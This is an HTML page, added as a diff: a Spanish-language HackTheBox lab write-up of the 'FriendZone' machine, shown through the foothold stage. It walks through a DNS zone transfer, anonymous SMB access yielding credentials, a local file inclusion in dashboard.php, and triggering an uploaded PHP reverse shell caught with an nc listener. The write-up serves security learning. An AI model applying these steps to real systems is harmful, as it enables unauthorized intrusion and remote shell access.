@@ -1,0 +1,1056 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>HTB: FriendZone — fl0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #f7f6f3;
+      --bg2: #ffffff;
+      --bg3: #edecea;
+      --text: #1a1917;
+      --text2: #5a584f;
+      --text3: #9a9890;
+      --accent: #c8382b;
+      --accent2: #e85d52;
+      --border: #d8d6d0;
+      --border2: #c0bdb5;
+      --mono: 'JetBrains Mono', monospace;
+      --sans: 'DM Sans', sans-serif;
+      --radius: 6px;
+      --radius-lg: 12px;
+    }
+
+    body.dark {
+      --bg: #111110;
+      --bg2: #1a1917;
+      --bg3: #222120;
+      --text: #e8e4dc;
+      --text2: #a09c94;
+      --text3: #5a5850;
+      --border: #2a2826;
+      --border2: #3a3834;
+    }
+    body.dark nav { background: rgba(17,17,16,0.88); }
+    body.dark footer { background: #0e0e0d; }
+    body.dark .code-block { background: #0e0e0d; border-color: #2a2826; }
+    body.dark .info-table { background: #0e0e0d; }
+
+    html { scroll-behavior: smooth; max-width: 100%; overflow-x: hidden; }
+    body { max-width: 100%; }
+    body {
+      font-family: var(--sans);
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      overflow-x: hidden;
+    }
+
+    /* ── CURSOR ── */
+    .cursor {
+      width: 8px; height: 8px;
+      background: var(--accent);
+      border-radius: 50%;
+      position: fixed; pointer-events: none;
+      z-index: 9999;
+      transition: transform 0.15s ease, opacity 0.2s;
+      transform: translate(-50%, -50%);
+    }
+    .cursor-ring {
+      width: 32px; height: 32px;
+      border: 1px solid var(--accent);
+      border-radius: 50%;
+      position: fixed; pointer-events: none;
+      z-index: 9998;
+      transition: transform 0.35s ease, opacity 0.3s;
+      transform: translate(-50%, -50%);
+      opacity: 0.5;
+    }
+
+    /* ── NAV ── */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0;
+      z-index: 100;
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 0 48px; height: 64px;
+      background: rgba(247,246,243,0.88);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+    .nav-logo {
+      font-family: var(--mono); font-size: 14px; font-weight: 500;
+      color: var(--text); text-decoration: none;
+      display: flex; align-items: center; gap: 6px;
+    }
+    .nav-logo .bracket { color: var(--text3); }
+    .nav-logo .name em { color: var(--accent); font-style: normal; }
+    .nav-back {
+      font-family: var(--mono); font-size: 12px;
+      color: var(--text2); text-decoration: none;
+      letter-spacing: 0.04em;
+      display: flex; align-items: center; gap: 6px;
+      transition: color 0.2s;
+    }
+    .nav-back:hover { color: var(--accent); }
+    .nav-right { display: flex; align-items: center; gap: 24px; }
+
+    .theme-toggle {
+      display: flex; align-items: center; gap: 6px;
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); cursor: pointer;
+      background: none; border: 1px solid var(--border);
+      padding: 6px 12px; border-radius: var(--radius);
+      transition: border-color 0.2s, color 0.2s;
+    }
+    .theme-toggle:hover { border-color: var(--accent); color: var(--accent); }
+
+    /* ── HERO ── */
+    .writeup-hero {
+      padding: 120px 48px 64px;
+      border-bottom: 1px solid var(--border);
+      background: var(--bg2);
+      position: relative;
+      overflow: hidden;
+    }
+    .hero-grid-bg {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(var(--border) 1px, transparent 1px),
+        linear-gradient(90deg, var(--border) 1px, transparent 1px);
+      background-size: 48px 48px;
+      opacity: 0.25;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 860px; }
+
+    .hero-breadcrumb {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); letter-spacing: 0.08em;
+      margin-bottom: 24px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .hero-breadcrumb a { color: var(--text3); text-decoration: none; transition: color 0.2s; }
+    .hero-breadcrumb a:hover { color: var(--accent); }
+    .hero-breadcrumb span { color: var(--border2); }
+
+    .writeup-hero h1 {
+      font-size: clamp(36px, 5vw, 64px);
+      font-weight: 300;
+      letter-spacing: -0.03em;
+      line-height: 1.05;
+      margin-bottom: 20px;
+    }
+    .writeup-hero h1 em { font-style: normal; color: var(--accent); }
+
+    .hero-meta {
+      display: flex; align-items: center; gap: 12px; flex-wrap: wrap;
+      margin-bottom: 32px;
+    }
+    .meta-badge {
+      font-family: var(--mono); font-size: 10px;
+      padding: 4px 12px; border-radius: 100px;
+      letter-spacing: 0.06em;
+      border: 1px solid var(--border);
+      background: var(--bg);
+      color: var(--text2);
+    }
+    .meta-badge.easy { background: #e8f5e9; color: #2e7d32; border-color: #c8e6c9; }
+    .meta-badge.os   { background: #fff0ef; color: var(--accent); border-color: #f0c8c4; }
+    .meta-badge.date { color: var(--text3); }
+
+    .hero-techniques {
+      display: flex; flex-wrap: wrap; gap: 8px;
+    }
+    .tech-tag {
+      font-family: var(--mono); font-size: 11px;
+      padding: 5px 12px; border-radius: var(--radius);
+      background: var(--bg3); border: 1px solid var(--border);
+      color: var(--text2); letter-spacing: 0.03em;
+    }
+
+    /* ── LAYOUT ── */
+    .writeup-layout {
+      display: grid;
+      grid-template-columns: 220px 1fr;
+      gap: 0;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 48px;
+      align-items: start;
+      width: 100%;
+    }
+
+    /* ── TOC ── */
+    .toc {
+      position: sticky; top: 88px;
+      padding: 40px 0 40px 0;
+      padding-right: 48px;
+      border-right: 1px solid var(--border);
+    }
+    .toc-title {
+      font-family: var(--mono); font-size: 10px;
+      color: var(--text3); letter-spacing: 0.12em;
+      text-transform: uppercase; margin-bottom: 16px;
+    }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 2px; }
+    .toc-list a {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); text-decoration: none;
+      letter-spacing: 0.03em;
+      padding: 5px 8px; border-radius: var(--radius);
+      display: block;
+      transition: background 0.15s, color 0.15s;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--accent); background: var(--bg3); border-left-color: var(--accent); }
+    .toc-list a.sub { padding-left: 20px; font-size: 10px; }
+
+    /* ── CONTENT ── */
+    .writeup-content {
+      padding: 48px 0 80px 48px;
+      max-width: 720px;
+      min-width: 0;
+      width: 100%;
+    }
+
+    .writeup-section { margin-bottom: 64px; }
+
+    .section-label {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); letter-spacing: 0.12em;
+      text-transform: uppercase; margin-bottom: 12px;
+      display: flex; align-items: center; gap: 12px;
+    }
+    .section-label::after {
+      content: ''; flex: 1; max-width: 48px;
+      height: 1px; background: var(--border2);
+    }
+
+    .writeup-content h2 {
+      font-size: 26px; font-weight: 400;
+      letter-spacing: -0.02em;
+      color: var(--text); margin-bottom: 24px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid var(--border);
+    }
+    .writeup-content h2 em { font-style: normal; color: var(--accent); }
+
+    .writeup-content h3 {
+      font-family: var(--mono); font-size: 13px;
+      font-weight: 500; color: var(--text);
+      margin: 32px 0 12px;
+      display: flex; align-items: center; gap: 8px;
+    }
+    .writeup-content h3::before {
+      content: '##';
+      color: var(--accent); font-size: 11px;
+    }
+
+    .writeup-content p {
+      font-size: 15px; color: var(--text2);
+      line-height: 1.8; margin-bottom: 16px;
+    }
+
+    .writeup-content ul.bullet-list {
+      list-style: none;
+      margin: 4px 0 16px;
+      display: flex; flex-direction: column; gap: 6px;
+    }
+    .writeup-content ul.bullet-list li {
+      font-size: 14px; color: var(--text2);
+      padding-left: 18px; position: relative;
+    }
+    .writeup-content ul.bullet-list li::before {
+      content: '›'; color: var(--accent);
+      position: absolute; left: 0; font-weight: 600;
+    }
+
+    code {
+      font-family: var(--mono); font-size: 12px;
+      background: var(--bg3); border: 1px solid var(--border);
+      padding: 2px 6px; border-radius: 4px;
+      color: var(--accent);
+    }
+
+    /* ── CODE BLOCK ── */
+    .code-block {
+      background: #1a1917;
+      border: 1px solid #3a3834;
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      margin: 20px 0;
+      width: 100%;
+      min-width: 0;
+      max-width: 100%;
+    }
+    .code-bar {
+      background: #252420;
+      padding: 10px 16px;
+      display: flex; align-items: center; justify-content: space-between;
+      border-bottom: 1px solid #3a3834;
+    }
+    .code-bar-left { display: flex; align-items: center; gap: 8px; }
+    .code-dot { width: 10px; height: 10px; border-radius: 50%; }
+    .code-lang {
+      font-family: var(--mono); font-size: 10px;
+      color: #6b6860; letter-spacing: 0.08em; text-transform: uppercase;
+    }
+    .code-copy {
+      font-family: var(--mono); font-size: 10px;
+      color: #5a5850; cursor: pointer; background: none;
+      border: none; letter-spacing: 0.06em;
+      transition: color 0.2s;
+    }
+    .code-copy:hover { color: #c8c4bc; }
+    .code-body {
+      padding: 20px;
+      font-family: var(--mono); font-size: 12.5px;
+      line-height: 1.85; color: #c8c4bc;
+      overflow-x: auto;
+      white-space: pre;
+      width: 100%;
+      max-width: 100%;
+      box-sizing: border-box;
+      -webkit-overflow-scrolling: touch;
+    }
+    .code-body .c-prompt { color: #688f6a; }
+    .code-body .c-cmd    { color: #e8e4dc; }
+    .code-body .c-flag   { color: #7ab0e8; }
+    .code-body .c-str    { color: #8eb87a; }
+    .code-body .c-key    { color: #c8382b; }
+    .code-body .c-comment{ color: #5a5850; }
+    .code-body .c-tag    { color: #d4a84a; }
+    .code-body .c-attr   { color: #7ab0e8; }
+    .code-body .c-val    { color: #8eb87a; }
+
+    /* ── INFO TABLE ── */
+    .info-table {
+      width: 100%; border-collapse: separate; border-spacing: 0;
+      background: var(--bg2); border: 1px solid var(--border);
+      border-radius: var(--radius-lg); overflow: hidden;
+      margin-bottom: 32px; font-size: 13px;
+    }
+    .info-table tr { border-bottom: 1px solid var(--border); }
+    .info-table tr:last-child { border-bottom: none; }
+    .info-table td { padding: 12px 20px; vertical-align: middle; }
+    .info-table td:first-child {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--text3); letter-spacing: 0.06em;
+      text-transform: uppercase; width: 140px;
+      background: var(--bg3); border-right: 1px solid var(--border);
+    }
+    .info-table td:last-child { color: var(--text2); }
+
+    /* ── CALLOUT ── */
+    .callout {
+      border-left: 3px solid var(--accent);
+      background: #fff0ef;
+      border-radius: 0 var(--radius) var(--radius) 0;
+      padding: 16px 20px; margin: 20px 0;
+    }
+    body.dark .callout { background: #2a1a18; }
+    .callout-title {
+      font-family: var(--mono); font-size: 11px;
+      color: var(--accent); letter-spacing: 0.08em;
+      text-transform: uppercase; margin-bottom: 6px;
+    }
+    .callout p { font-size: 14px; margin-bottom: 0; }
+
+    /* ── SCREENSHOT ── */
+    .screenshot {
+      margin: 20px 0; border-radius: var(--radius-lg);
+      border: 1px solid var(--border); overflow: hidden;
+    }
+    .screenshot-bar {
+      background: var(--bg3); padding: 8px 14px;
+      display: flex; align-items: center; gap: 8px;
+      border-bottom: 1px solid var(--border);
+    }
+    .screenshot-dot { width: 8px; height: 8px; border-radius: 50%; background: var(--border2); }
+    .screenshot-label {
+      font-family: var(--mono); font-size: 10px;
+      color: var(--text3); letter-spacing: 0.06em;
+    }
+    .screenshot img { width: 100%; display: block; }
+
+    /* ── LESSONS ── */
+    .lessons-list { display: flex; flex-direction: column; gap: 16px; margin-top: 8px; }
+    .lesson-item {
+      display: flex; gap: 16px; align-items: flex-start;
+      background: var(--bg2); border: 1px solid var(--border);
+      border-radius: var(--radius-lg); padding: 20px;
+      transition: border-color 0.2s;
+    }
+    .lesson-item:hover { border-color: var(--accent); }
+    .lesson-num {
+      font-family: var(--mono); font-size: 20px;
+      font-weight: 300; color: var(--border2);
+      flex-shrink: 0; width: 32px; line-height: 1;
+      padding-top: 2px;
+    }
+    .lesson-body { }
+    .lesson-title {
+      font-family: var(--mono); font-size: 13px;
+      font-weight: 500; color: var(--text);
+      margin-bottom: 6px;
+    }
+    .lesson-desc { font-size: 14px; color: var(--text2); line-height: 1.7; }
+
+    /* ── FOOTER ── */
+    footer {
+      background: var(--bg2);
+      border-top: 1px solid var(--border);
+      padding: 32px 48px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .footer-logo {
+      font-family: var(--mono); font-size: 13px;
+      color: var(--text3);
+    }
+    .footer-logo em { color: var(--accent); font-style: normal; }
+    .footer-copy { font-size: 13px; color: var(--text3); }
+
+    /* ── REVEAL ── */
+    .reveal { opacity: 0; transform: translateY(16px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .reveal.visible { opacity: 1; transform: none; }
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 180px 1fr; }
+      .writeup-content { padding-left: 32px; }
+      .toc { padding-right: 24px; }
+    }
+
+    @media (max-width: 768px) {
+      nav { padding: 0 20px; }
+      .nav-back { display: none; }
+      .writeup-hero { padding: 88px 20px 40px; }
+      .writeup-layout {
+        grid-template-columns: minmax(0, 1fr);
+        padding: 0 20px;
+        width: 100%;
+      }
+      .toc { display: none; }
+      .writeup-content {
+        padding: 32px 0 60px;
+        max-width: 100%;
+        width: 100%;
+        min-width: 0;
+      }
+      .writeup-content h2 { font-size: 22px; }
+      .writeup-content h3 { font-size: 12px; margin: 28px 0 10px; }
+      .writeup-content p { font-size: 14px; }
+
+      .info-table { font-size: 12px; }
+      .info-table td { padding: 10px 12px; }
+      .info-table td:first-child { width: 100px; }
+
+      .code-block { margin: 16px 0; border-radius: var(--radius); }
+      .code-body {
+        padding: 14px;
+        font-size: 11px;
+        line-height: 1.7;
+      }
+      .code-bar { padding: 8px 12px; }
+
+      .hero-meta { gap: 8px; }
+      .hero-techniques { gap: 6px; }
+      .tech-tag { font-size: 10px; padding: 4px 10px; }
+
+      .lesson-item { flex-direction: column; gap: 8px; padding: 16px; }
+      .lesson-num { width: auto; font-size: 16px; }
+
+      .callout { padding: 14px 16px; }
+
+      footer {
+        padding: 24px 20px;
+        flex-direction: column;
+        gap: 8px;
+        text-align: center;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .writeup-hero h1 { font-size: 36px; }
+      .meta-badge { font-size: 9px; padding: 3px 10px; }
+      .code-body { font-size: 10px; }
+      .screenshot-label { font-size: 9px; }
+    }
+
+    /* prevent horizontal overflow globally */
+    img, .screenshot {
+      max-width: 100%;
+    }
+    .info-table {
+      display: block;
+      overflow-x: auto;
+      white-space: nowrap;
+    }
+    .info-table tr { display: table-row; }
+    @media (min-width: 769px) {
+      .info-table { display: table; white-space: normal; }
+    }
+  </style>
+</head>
+<body>
+
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursor-ring"></div>
+
+<!-- ── NAV ── -->
+<nav>
+  <a href="../../" class="nav-logo">
+    <span class="bracket">{</span>
+    <span class="name">fl<em>0</em></span>
+    <span class="bracket">}</span>
+  </a>
+  <div class="nav-right">
+    <a href="../../#writeups" class="nav-back">← writeups</a>
+    <button class="theme-toggle" onclick="toggleTheme()">
+      <span id="toggle-icon">🌙</span>
+      <span id="toggle-label">dark</span>
+    </button>
+  </div>
+</nav>
+
+<!-- ── HERO ── -->
+<div class="writeup-hero">
+  <div class="hero-grid-bg"></div>
+  <div class="writeup-hero-content">
+    <div class="hero-breadcrumb">
+      <a href="../../">fl0</a>
+      <span>/</span>
+      <a href="../../#writeups">writeups</a>
+      <span>/</span>
+      friendzone
+    </div>
+
+    <h1>Friend<em>Zone</em></h1>
+
+    <div class="hero-meta">
+      <span class="meta-badge os">Linux</span>
+      <span class="meta-badge easy">Easy</span>
+      <span class="meta-badge date">14 May 2026</span>
+      <span class="meta-badge">HackTheBox</span>
+    </div>
+
+    <div class="hero-techniques">
+      <span class="tech-tag">DNS Zone Transfer</span>
+      <span class="tech-tag">SMB Enumeration</span>
+      <span class="tech-tag">LFI</span>
+      <span class="tech-tag">Python Module Hijacking</span>
+    </div>
+  </div>
+</div>
+
+<!-- ── MAIN ── -->
+<div class="writeup-layout">
+
+  <!-- TOC -->
+  <aside class="toc">
+    <div class="toc-title">contenido</div>
+    <ul class="toc-list">
+      <li><a href="#info">Información general</a></li>
+      <li><a href="#recon">Reconocimiento</a></li>
+      <li><a href="#nmap" class="sub">↳ Nmap</a></li>
+      <li><a href="#dns" class="sub">↳ DNS Zone Transfer</a></li>
+      <li><a href="#smb" class="sub">↳ SMB</a></li>
+      <li><a href="#vhosts" class="sub">↳ Vhosts HTTPS</a></li>
+      <li><a href="#explotacion">Explotación</a></li>
+      <li><a href="#lfi" class="sub">↳ LFI vía dashboard.php</a></li>
+      <li><a href="#foothold">Foothold</a></li>
+      <li><a href="#privesc">Escalada de privilegios</a></li>
+      <li><a href="#lessons">Lecciones aprendidas</a></li>
+    </ul>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content">
+
+    <!-- INFO -->
+    <div class="writeup-section reveal" id="info">
+      <div class="section-label">overview</div>
+      <h2>Información <em>general</em></h2>
+      <table class="info-table">
+        <tr><td>OS</td><td>Linux (Ubuntu)</td></tr>
+        <tr><td>Dificultad</td><td>Easy</td></tr>
+        <tr><td>Plataforma</td><td>HackTheBox</td></tr>
+        <tr><td>Técnicas</td><td>DNS Zone Transfer · SMB Enumeration · LFI · Python Module Hijacking</td></tr>
+      </table>
+    </div>
+
+    <!-- RECONOCIMIENTO -->
+    <div class="writeup-section reveal" id="recon">
+      <div class="section-label">fase 1</div>
+      <h2><em>Reconocimiento</em></h2>
+
+      <h3 id="nmap">Nmap</h3>
+      <p>Escaneo completo de puertos:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-prompt">❯</span> <span class="c-cmd">nmap -p- --open -sCV -T4 -Pn -n 10.129.45.67 -oN scaneonmap.txt -vvv</span></div>
+      </div>
+
+      <p>Resultado relevante:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">output</span>
+          </div>
+        </div>
+        <div class="code-body"><span class="c-tag">PORT</span>    <span class="c-str">STATE</span> <span class="c-attr">SERVICE</span>     <span class="c-val">VERSION</span>
+<span class="c-key">21/tcp</span>  open  ftp         vsftpd 3.0.3
+<span class="c-key">22/tcp</span>  open  ssh         OpenSSH 7.6p1 Ubuntu 4
+<span class="c-key">53/tcp</span>  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu)
+<span class="c-key">80/tcp</span>  open  http        Apache httpd 2.4.29 (Ubuntu)
+<span class="c-comment">  |_http-title: Friend Zone Escape software</span>
+<span class="c-key">139/tcp</span> open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+<span class="c-key">443/tcp</span> open  ssl/http    Apache httpd 2.4.29
+<span class="c-comment">  | ssl-cert: Subject: commonName=friendzone.red</span>
+<span class="c-key">445/tcp</span> open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span></div>
+      </div>
+
+      <p>Mucha superficie de ataque: FTP, SSH, DNS, HTTP/HTTPS y SMB. El certificado SSL del puerto 443 revela el <code>commonName=friendzone.red</code> — un dominio real que podemos investigar.</p>
+
+      <h3 id="dns">DNS Zone Transfer</h3>
+      <p>Con el puerto 53 abierto y un dominio identificado, probamos una transferencia de zona AXFR. Si el servidor DNS está mal configurado, nos devolverá todos los registros de la zona, incluyendo subdominios internos:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-prompt">❯</span> <span class="c-cmd">dig axfr friendzone.red @10.129.45.67</span>
+
+friendzone.red.              604800 IN SOA   localhost. root.localhost. ...
+friendzone.red.              604800 IN A     127.0.0.1
+<span class="c-key">administrator1.friendzone.red.</span> 604800 IN A 127.0.0.1
+<span class="c-key">hr.friendzone.red.</span>            604800 IN A 127.0.0.1
+<span class="c-key">uploads.friendzone.red.</span>       604800 IN A 127.0.0.1</div>
+      </div>
+
+      <div class="callout">
+        <div class="callout-title">⚡ Hallazgo</div>
+        <p>Tres subdominios nuevos: <code>administrator1</code>, <code>hr</code> y <code>uploads</code>. Como todos apuntan a <code>127.0.0.1</code>, lo más probable es que sean virtual hosts servidos por el mismo Apache.</p>
+      </div>
+
+      <p>Los añadimos a <code>/etc/hosts</code> para poder resolverlos:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">/etc/hosts</span>
+          </div>
+        </div>
+        <div class="code-body">10.129.45.67  friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red</div>
+      </div>
+
+      <h3 id="smb">SMB</h3>
+      <p>Con el puerto 445 abierto, enumeramos los recursos compartidos con <code>enum4linux</code>:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-prompt">❯</span> <span class="c-cmd">enum4linux 10.129.45.67</span>
+
+<span class="c-tag">Sharename</span>       <span class="c-tag">Type</span>      <span class="c-tag">Comment</span>
+---------       ----      -------
+print$          Disk      Printer Drivers
+<span class="c-key">Files</span>           Disk      FriendZone Samba Server Files /etc/Files
+<span class="c-key">general</span>         Disk      FriendZone Samba Server Files
+<span class="c-key">Development</span>     Disk      FriendZone Samba Server Files
+IPC$</div>
+      </div>
+
+      <p>Tres recursos interesantes. Probamos a conectar sin autenticación (<code>-N</code>) con <code>smbclient</code>:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-comment"># recurso "general"</span>
+<span class="c-prompt">❯</span> <span class="c-cmd">smbclient -N \\\\10.129.45.67\\general</span>
+smb: \&gt; <span class="c-cmd">dir</span>
+  creds.txt   N   57   Wed Oct 10 01:52:42 2018
+
+smb: \&gt; <span class="c-cmd">get creds.txt</span>
+
+<span class="c-comment"># contenido de creds.txt</span>
+creds for the admin THING:
+<span class="c-key">admin:WORKWORKHhallelujah@#</span></div>
+      </div>
+
+      <div class="callout">
+        <div class="callout-title">⚡ Credenciales obtenidas</div>
+        <p>El recurso <code>general</code> es de solo lectura y contiene <code>creds.txt</code> con credenciales <code>admin:WORKWORKHhallelujah@#</code>. El recurso <code>Development</code> está vacío pero permite escritura — lo aprovecharemos más adelante.</p>
+      </div>
+
+      <h3 id="vhosts">Vhosts HTTPS</h3>
+      <p>El puerto 443 sirve contenido distinto al 80. Aceptamos el certificado autofirmado y enumeramos directorios sobre el vhost <code>administrator1.friendzone.red</code> (<code>-k</code> para ignorar errores de certificado):</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-prompt">❯</span> <span class="c-cmd">gobuster dir -u https://administrator1.friendzone.red/ \
+        -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
+        -x .php -t 50 -k</span>
+
+<span class="c-key">/login.php</span>
+<span class="c-key">/dashboard.php</span>
+<span class="c-key">/timestamp.php</span></div>
+      </div>
+
+      <p>Con las credenciales <code>admin:WORKWORKHhallelujah@#</code> obtenidas del SMB iniciamos sesión y accedemos al dashboard:</p>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <span class="screenshot-label">administrator1.friendzone.red/dashboard.php</span>
+        </div>
+        <img src="img/dashboard.png" alt="Dashboard de FriendZone Admin tras login" />
+      </div>
+
+      <p>El mensaje indica que la página renderiza contenido a partir de un parámetro <code>image_id</code> y <code>pagename</code>, y que es <strong>un script PHP poco probado</strong> — señal de alarma. La sintaxis por defecto sugerida es <code>image_id=a.jpg&pagename=timestamp</code>.</p>
+    </div>
+
+    <!-- EXPLOTACIÓN -->
+    <div class="writeup-section reveal" id="explotacion">
+      <div class="section-label">fase 2</div>
+      <h2><em>Explotación</em></h2>
+
+      <h3 id="lfi">LFI vía dashboard.php</h3>
+      <p>Probamos a manipular el parámetro <code>pagename</code> apuntando a un archivo PHP que sabemos que existe (<code>login</code>), para comprobar si el script lo incluye y ejecuta dinámicamente:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">url</span>
+          </div>
+        </div>
+        <div class="code-body">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=login</div>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <span class="screenshot-label">Resultado: ejecuta login.php → "Wrong!"</span>
+        </div>
+        <img src="img/wrong_lfi.png" alt="La página ejecuta la lógica de login.php y muestra Wrong!" />
+      </div>
+
+      <div class="callout">
+        <div class="callout-title">⚡ LFI confirmada</div>
+        <p>El parámetro <code>pagename</code> se concatena a una ruta y se incluye con algo equivalente a <code>include($pagename . '.php')</code>. Esto es un <strong>Local File Inclusion</strong> — y si conseguimos colocar un archivo PHP en cualquier ruta del sistema, podemos ejecutarlo apuntando <code>pagename</code> a esa ruta (sin extensión <code>.php</code>, ya que el script la añade).</p>
+      </div>
+
+      <p>Recordamos que el recurso SMB <code>Files</code> tenía el comentario <em>"FriendZone Samba Server Files /etc/Files"</em>, lo que revela que los shares SMB están montados bajo <code>/etc/</code>. Por tanto, <code>Development</code> probablemente está en <code>/etc/Development</code> — y ahí sí tenemos permisos de escritura.</p>
+    </div>
+
+    <!-- FOOTHOLD -->
+    <div class="writeup-section reveal" id="foothold">
+      <div class="section-label">fase 3</div>
+      <h2><em>Foothold</em></h2>
+
+      <p>Subimos una reverse shell PHP al recurso <code>Development</code> vía SMB:</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-prompt">❯</span> <span class="c-cmd">smbclient -N \\\\10.129.45.67\\Development</span>
+smb: \&gt; <span class="c-cmd">put php-reverse-shell.php</span>
+putting file php-reverse-shell.php as \php-reverse-shell.php</div>
+      </div>
+
+      <p>Nos ponemos en escucha y disparamos el LFI apuntando a la ruta del archivo subido (sin extensión, ya que el script la añade):</p>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">bash</span>
+          </div>
+          <button class="code-copy" onclick="copyCode(this)">copiar</button>
+        </div>
+        <div class="code-body"><span class="c-prompt">❯</span> <span class="c-cmd">nc -nlvp 4444</span></div>
+      </div>
+
+      <div class="code-block">
+        <div class="code-bar">
+          <div class="code-bar-left">
+            <div class="code-dot" style="background:#e05252"></div>
+            <div class="code-dot" style="background:#d4a84a"></div>
+            <div class="code-dot" style="background:#8eb87a"></div>
+            <span class="code-lang">url</span>
+          </div>
+        </div>
+        <div class="code-body">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/php-reverse-shell</div>
+      </div>
+
+      <div class="screenshot">
+        <div class="screenshot-bar">
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <div class="screenshot-dot"></div>
+          <span class="screenshot-label">nc recibiendo la conexión como www-data</span>
+        </div>
+        <img src="img/revshell.png" alt="Reverse shell recibida, uid=33(www-data)" />
+      </div>
+
